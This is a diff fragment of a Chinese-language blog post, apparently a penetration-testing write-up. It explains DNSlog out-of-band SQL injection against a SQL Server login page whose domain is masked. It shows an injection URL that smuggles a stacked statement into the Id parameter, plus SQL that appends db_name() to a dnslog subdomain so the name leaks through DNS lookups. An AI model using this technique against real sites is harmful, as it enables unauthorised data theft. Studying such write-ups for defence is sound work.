@@ -182,7 +182,9 @@
 <p>这两种注入类型的缺点就是速度慢，效率低，一个是基于对错判断数据，一个是基于访问时间来判断数据，dnslog的出现就正好弥补了这样的缺陷。</p>
 <p>说到这里我不得不吐槽一下，cloudeye作为一个dnslog平台已经关门大吉了却不把web服务器关掉，让我误以为是我操作不当导致收不到日志，后来用的另外一个dnslog平台。。</p>
 <p>回到正题，经过推测这个注入点是sql server数据库的，sql server如果要进行dns解析的话用master..xp_dirtree这个存储过程，最终构造出如下语句：</p>
+<blockquote>
 <p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;DECLARE" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;DECLARE</a> @host varchar(1024);S</p>
+</blockquote>
 <p>解释一下整个语句的意思<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</div></pre></td></tr></table></figure></p>
 <p>这条语句的意思是注册一个名为@host的变量，类型为varchar<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),db_name())+<span class="string">'.xxxxxxxxx.dnslog.link'</span>;</div></pre></td></tr></table></figure></p>
 <p>这条语句的意思是获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。</p>
